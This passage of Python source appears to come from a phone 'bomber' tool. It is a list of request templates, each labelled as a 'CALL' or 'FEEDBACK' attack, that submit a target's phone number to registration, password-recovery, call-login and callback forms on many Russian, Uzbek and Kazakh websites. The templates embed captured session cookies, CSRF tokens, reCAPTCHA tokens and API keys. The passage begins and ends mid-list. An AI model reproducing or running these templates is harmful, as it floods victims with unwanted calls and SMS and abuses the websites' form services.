            'data': {'email': email(), 'telephone': number, 'password': 'QWERarin454545', 'confirm': 'QWERarin454545', 'needUpdateCache': 'false', 'notSimple': 'true'},
            # Регистрация по смс (если нет акка)
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'HappyWear.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckPhone',
            'data': {'telephone': number, 'isFirstIteration': 'false'},
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Beelineru.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://beelineru.ru/',
            'cookies': {'__ddg1_': 'i60yfTE7CmjuGPO7arbk', 'reftail3': 'https%3A%2F%2Fyandex.uz%2F', '_ga': 'GA1.1.694262820.1677841558', '_ym_uid': '167784156178138254', '_ym_d': '1677841561', '_ym_isad': '1', 'PHPSESSID': 'fa70e59c304238e231bf7b81b633260e', '_ym_visorc': 'w', '_ga_RL5NMTR17P': 'GS1.1.1677903461.2.0.1677903461.0.0.0',},
            'headers': {'authority': 'beelineru.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarybeAvsibcGye6nhSp', 'origin': 'https://beelineru.ru', 'referer': 'https://beelineru.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="submitted"\r\n\r\n11839\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="isPopup11839"\r\n\r\n1\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[11841]"\r\n\r\nМосква\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[11842]"\r\n\r\n\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[11843]"\r\n\r\n\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[11844]"\r\n\r\n\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[11845]"\r\n\r\n\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[11846]"\r\n\r\n+{number}\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[11849]"\r\n\r\n1\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[22566]"\r\n\r\n\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[0]"\r\n\r\nae623bfd0f06d07a4b42815a8d4d7dde2\r\n------WebKitFormBoundarybeAvsibcGye6nhSp\r\nContent-Disposition: form-data; name="fields[1]"\r\n\r\n\r\n------WebKitFormBoundarybeAvsibcGye6nhSp--\r\n'.encode()
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Beelineru.ru', 'anonymous': 'Yes'},
            'method': 'get',
            'url': 'https://domconnect.ru/api.phone_info',
            'headers': {'authority': 'domconnect.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'origin': 'https://beelineru.ru', 'referer': 'https://beelineru.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'params': {'apikey': 'ace5aea03144bfea692ab289f3045bfd6a7f2440da8ba809', 'num': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'DNS-Shop.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.dns-shop.ru/auth/auth/fast-authorization/',
            'cookies': { '_ym_uid': '1684606746537008949', '_ym_d': '1684606746', '_ga_ND7GY87YET': 'GS1.1.1684606738.1.0.1684607414.0.0.0', 'qrator_ssid': '1686402414.300.Ig8SA6thu1gRn68g-i8ommj2aea3p09g78havnhlokk1upi5t', 'lang': 'ru', 'city_path': 'moscow', 'PHPSESSID': 'c92c9e57e6d054bfb188966b5f70cea4', '_csrf': 'ac678211ac81d48a5d4037f64bee392a23c4cc8597f31a066de5ebd744030725a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22HfpvYBwjTvkQF4TdTnvGG2cHlP0nz0l4%22%3B%7D', 'cartUserCookieIdent_v3': '6c325b4f3c03e1d47ff058f13ce53f3db80c30fb2d57b63d7c131d797b583eb5a%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%2240751e5b-3e51-3531-a4ca-c1767d1198e4%22%3B%7D', 'phonesIdent': 'e0a468a70a33485f6abc6a96b90ad8c7b58b5e72ca2a6391537b0b3b4f849f16a%3A2%3A%7Bi%3A0%3Bs%3A11%3A%22phonesIdent%22%3Bi%3A1%3Bs%3A36%3A%221b729425-bd54-44ec-a52f-e3c137e81cc2%22%3B%7D', '_gid': 'GA1.2.1715974698.1686402409', 'rrpvid': '684861184281623', '_gcl_au': '1.1.1610406167.1686402409', 'rcuid': '64847571ef0b6f85d31d4e5e', 'tmr_lvid': 'b626229b570353e2b5c28694ad72c543', 'tmr_lvidTS': '1686402409491', '_ym_isad': '1', '_ym_visorc': 'b', 'current_path': '605bfdc517d7e9e23947448a9bf1ce16ac36b884434a3fdb10db053793c50392a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A115%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22manual%22%7D%22%3B%7D', 'tmr_detect': '1%7C1686403442324', '_ga': 'GA1.2.189679919.1684606738', 'qrator_jsid': '1686402413.642.TSWG5emdch2JVvhL-01k5mh7u2mau1f2s55rhqpcb0r28b6lq', 'dnsauth_csrf': '795b7dfc4011a72b6db37ff0d3a6aae15df7cc7e7c637d9f29a28881244daeb0a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%2286ea0822-aee9-4590-a937-0d7df5e166c3%22%3B%7D', '_gat_UA-8349380-2': '1', '_ga_FLS4JETDHW': 'GS1.1.1686402409.1.1.1686404004.50.0.0',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary0wHlD025l3Q0EvfA', 'Origin': 'https://www.dns-shop.ru', 'Referer': 'https://www.dns-shop.ru/feedback/no-referrer', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-Token': 'vcCJbQlg_iv9r8zKeJSUU7No-Posyic-CxrVwEsTAw_1pvkbUCKJQanZp5s-oMA35waOvWv4RHZnSuWuMSNvOw==', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundary0wHlD025l3Q0EvfA\r\nContent-Disposition: form-data; name="FastAuthorizationLoginLoadForm[login]"\r\n\r\n{number}\r\n------WebKitFormBoundary0wHlD025l3Q0EvfA\r\nContent-Disposition: form-data; name="FastAuthorizationLoginLoadForm[token]"\r\n\r\n\r\n------WebKitFormBoundary0wHlD025l3Q0EvfA\r\nContent-Disposition: form-data; name="FastAuthorizationLoginLoadForm[isPhoneCall]"\r\n\r\n1\r\n------WebKitFormBoundary0wHlD025l3Q0EvfA--\r\n',
        },
        {
            'info': {'country': 'ALL', 'attack': 'FEEDBACK', 'website': 'Acoustic.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://acoustic.uz/ru/',
            'cookies': {'pll_language': 'ru', 'tk_or': '%22%22', 'tk_r3d': '%22%22', 'tk_lr': '%22%22', '_wpfuuid': '9b160a8f-61b8-4bb3-8bb9-c7791d72ca3b',},
            'headers': {'authority': 'acoustic.uz', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarypQ3lATF7y71NBJQU', 'origin': 'https://acoustic.uz', 'referer': 'https://acoustic.uz/ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[fields][0][first]"\r\n\r\nINSIDE\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[fields][0][last]"\r\n\r\nINSIDE\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[fields][6]"\r\n\r\nСамарканд\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[fields][4]"\r\n\r\n+{number}\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[hp]"\r\n\r\n\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[id]"\r\n\r\n112\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[author]"\r\n\r\n1\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[post_id]"\r\n\r\n762\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU\r\nContent-Disposition: form-data; name="wpforms[submit]"\r\n\r\nwpforms-submit\r\n------WebKitFormBoundarypQ3lATF7y71NBJQU--\r\n'.encode(),
        },
        {
            'info': {'country': 'ALL', 'attack': 'FEEDBACK', 'website': 'Kainar-Media.kz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kainar-media.kz/wp-admin/admin-ajax.php',
            'cookies': {'PHPSESSID': '662f217286291919dca8b8a385110dc9', '_wpfuuid': 'cf1f39f1-69eb-4cb5-8506-11689ce94971',},
            'headers': {'authority': 'kainar-media.kz', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryFVUSuEzSXmUY8LRK', 'origin': 'https://kainar-media.kz', 'referer': 'https://kainar-media.kz/404-layout/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[fields][0]"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[fields][5]"\r\n\r\nRelofds 4,Wpdv 9\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[fields][3]"\r\n\r\n+{number}\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[fields][2]"\r\n\r\INSIDE\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[recaptcha]"\r\n\r\n03AL8dmw9GR6rfHzn6rABSSrP1vmaM70tJTT2vaEbl58hzmrDA4bRzAZQk1Bo695Ym1Fb_YO7o6dx85CcmAm4ASiU9yUHorSd8ckZhmlgk9nd55S-itQHPPha2MBGS2zRyMjaILJx2Xm9a_aPN2aXqh38g6sPgcy6KL-f3daJ_fSCixOEXvUipmA7LzS9UOcXC2vpXSlP3sAgPl2FLNcamVMNY_DUZAlNeo45CURpJ7BUXZd1r1A4J40vPOWCO1LfLPBNfwESrSkdj1jwkoql10-ZKTudYV3hNhZ2fD4Atbv0iHcGPqbkfHzp7JMI2qd-xy-EC_QkMCa5_tzAMh8G3pTNK0NXTH79M6kaQGDQUdLOcb5c4roOlyAL32oVghldtv0MRSB7h__EBNmSqr9t0KtEc4xF3PJ35unyAU1HOCtxJDr-CHpFNqOYtZkDd-JmUwLjbgmaB6g5didlIYmjPcL6fX1V3XxKzCYZKuc0SbkhB8hWpS53DQplOVbunC30MTVE27OcrJv5GYc7k7RrcdImv50S0zEdkHA\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[id]"\r\n\r\n12016\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[author]"\r\n\r\n1\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[post_id]"\r\n\r\n1219\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="pum_form_popup_id"\r\n\r\n12050\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[submit]"\r\n\r\nwpforms-submit\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="wpforms[token]"\r\n\r\n30c1a2f60fa6ec496d68620cfc28ca87\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="action"\r\n\r\nwpforms_submit\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK\r\nContent-Disposition: form-data; name="page_url"\r\n\r\nhttps://kainar-media.kz/404-layout/\r\n------WebKitFormBoundaryFVUSuEzSXmUY8LRK--\r\n',
        },
        {
            'info': {'country': 'ALL', 'attack': 'FEEDBACK', 'website': 'Econetsib.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://econetsib.ru', 'Referer': 'https://econetsib.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'formservices[]': ['5e066ff64773e0258b57c41e4fe46b7c', '3052bc2042006020e59306d3859faab3', 'f00c74c5e68c8bc0f098aae93716156e', '6b995a9d20bcaac4c5b03539c5b55358', '80bc6a4f08f5566f2549a725348997e0', '7d62e83c89ff23a2676159f43f120854',], 'name': 'INSIDE', 'phone': number, 'Checkbox': 'yes', 'form-spec-comments': '', 'tildaspec-cookie': 'rerf=AAAAAGSaqi48yx3aBJ90Ag==; ipp_uid=1687857710260/UlmlmQ0rN6rON5hl/Kgb4K/DXmXWt7GSEwzLQrw==; _ym_uid=1687857686999269304; _ym_d=1687857686; _ym_isad=1; _ga=GA1.2.738180081.1687857686; _gid=GA1.2.1483271523.1687857686; _ym_visorc=w; _fbp=fb.1.1687857686867.371915970; tildauid=1687857687435.928061; tildasid=1687857687435.973597; _ga_6SELH7BSL7=GS1.2.1687857686.1.1.1687857737.0.0.0; previousUrl=econetsib.ru%2Fbusiness', 'tildaspec-referer': 'https://econetsib.ru/business', 'tildaspec-formid': 'form461648654', 'tildaspec-formskey': '6d0d14ad36f78df81a03b273f9c0da6a', 'tildaspec-version-lib': '02.001', 'tildaspec-pageid': '28564733', 'tildaspec-projectid': '675550', 'tildaspec-lang': 'RU', 'tildaspec-fp': '6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773130373868383338',},
        },
        {
            'info': {'country': 'ALL', 'attack': 'FEEDBACK', 'website': 'PozitivTelecom.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://pozitivtelecom.ru/wp-json/contact-form-7/v1/contact-forms/315/feedback',
            'headers': {'authority': 'pozitivtelecom.ru', 'accept': 'application/json, */*;q=0.1', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryKWcmitROzzeBtDOU', 'origin': 'http://pozitivtelecom.ru', 'referer': 'http://pozitivtelecom.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n315\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.7.5.1\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f315-o2\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n6c1db277cb703d77a1fff48966b0083a\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="menu-863"\r\n\r\nЦифровое ТВ\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="text-353"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="tel-368"\r\n\r\n{number}\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="product-name"\r\n\r\n\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="ct_checkjs_cf7"\r\n\r\n78204b14b1da296324c579cbda0378d24e40b2338a6cc25decee1714cbc04884\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="apbct__email_id__wp_contact_form_7_51840"\r\n\r\n\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU\r\nContent-Disposition: form-data; name="apbct_event_id"\r\n\r\n51840\r\n------WebKitFormBoundaryKWcmitROzzeBtDOU--\r\n'.encode(),
        },
        {
            'info': {'country': 'ALL', 'attack': 'FEEDBACK', 'website': 'PozitivTelecom.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://server.comagic.ru/api/v1/',
            'headers': {'authority': 'server.comagic.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/json', 'origin': 'http://pozitivtelecom.ru', 'referer': 'http://pozitivtelecom.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'json': {'name': 'send_offline_request', 'params': {'name': 'INSIDE', 'phone': number, 'is_custom': True,}, 'key': 'aNU1FCkdS4qSGSmFVO0kyZVgGS1FwZpg', 'site_key': '', 'uri': 'http://pozitivtelecom.ru/', 'comagic_id': '7397275844.10867395279.1687858060', 'hit_id': 26709306846,},
        },










        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Pentabox.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://pentabox.ru', 'Referer': 'https://pentabox.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'formservices%5B%5D=32306916a9b51f3ab2d2fb5ac07df952&formservices%5B%5D=d895bc4c72d901e2893c7ff97baf038d&tildaspec-formname=%D0%97%D0%B0%D1%8F%D0%B2%D0%BA%D0%B0+%D1%82%D0%B5%D1%85%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%BA%D0%B0&Name=INSIDE&Email={email()}&tildaspec-phone-part%5B%5D-iso=+7&tildaspec-phone-part%5B%5D=({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&Phone=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&Selectbox=%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%BE%D0%B1%D1%80%D0%B0%D1%82%D0%BD%D1%8B%D0%B9+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BE%D0%BA&Textarea=%D0%A1%D0%A0%D0%9E%D0%A7%D0%9D%D0%9E!!!!!&form-spec-comments=&tildaspec-cookie=_ym_uid%3D1687696655622083077%3B+_ym_d%3D1687696655%3B+_ym_isad%3D1%3B+tildauid%3D1687696656069.552130%3B+tildasid%3D1687696656069.578852%3B+_ga%3DGA1.2.1388107316.1687696656%3B+_gid%3DGA1.2.2094477162.1687696656%3B+_ym_visorc%3Dw%3B+_gat%3D1%3B+previousUrl%3Dpentabox.ru%252Fcontact&tildaspec-referer=https%3A%2F%2Fpentabox.ru%2Fcontact&tildaspec-formid=form137650630&tildaspec-formskey=6bd852b1a14b2b89d7e7addc4ebdf7ea&tildaspec-version-lib=02.001&tildaspec-pageid=7883182&tildaspec-projectid=1035889&tildaspec-lang=RU&tildaspec-fp=6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773131303068383338',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Ugtelecom.info', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ugtelecom.info/wp-json/contact-form-7/v1/contact-forms/1227/feedback',
            'headers': {'authority': 'ugtelecom.info', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryX2niA3cBn6cdkBOh', 'origin': 'https://ugtelecom.info', 'referer': 'https://ugtelecom.info/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n1227\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.3.2\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f1227-o3\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="_wpcf7_recaptcha_response"\r\n\r\n03AL8dmw-FFs7gE3Qv5O061s_eRLgiaKkc1Ak0WasfTjhw_gIbBDoxblMcZX2irdDSSFmME6isJ9e-FhDt851HHsFsYweVnDeT8xf3iiyfUCwn67ODON5gAum_pe_fypuBooEup69yN59fyfZJHIvoqJlsxdSNfuA61J3QUqygt-JsbqnkZp-rPzVHwHN1c0kPS3cVaOZ4AklkrgUjqc-pzM2JCTAhqhrQNPWQavCwScLImiUr9UHqBiLjxT8S03P23PrUxRdvQwNCH-1WWLno9eC7GcIGkc3q7i3noTqjyb7Ur_i9NOHeEdjXVaYgk2GJE0ZYm7kOr0prmPqM_jkgiQozWE3ZoCdlpXC0Cj4DX7RmGo5qDA0lQqHU5QEwzYtlStHOQm-6qNI3OKG9Hklyd3uXA1hoMtPhnOvIj8yIc9KDTZ89CNdY6V0JxYTLtr6I4Qmv2irMVanYuoqnteq2dwrvIp4Qa_nkAqGC06MBu8fJqqMZmeIGxeeCkUzxncdrT1AgwgamjfIGchpaMG7klki_bZv4f_LpP30B5Y38Vpf_Awe_ENoshGM\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="contact-name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundaryX2niA3cBn6cdkBOh--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Rutaxi.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.yandex.ru/surveys/10032143.509ddd8d4a2ad8864da144a188a6f19bf3dbc852/',
            'headers': {'authority': 'forms.yandex.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryJGoVJf1j1LYkiGFW', 'origin': 'https://forms.yandex.ru', 'referer': 'https://forms.yandex.ru/surveys/10032143.509ddd8d4a2ad8864da144a188a6f19bf3dbc852/?utm_source=rutaxiru_mainblock&lpc_url=http%3A%2F%2Frutaxi.ru%2Fdriver%2Fcities%2Fsaint-petersburg%3Futm_source%3Drutaxiru_mainblock&iframe=1&lang=ru', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'iframe', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
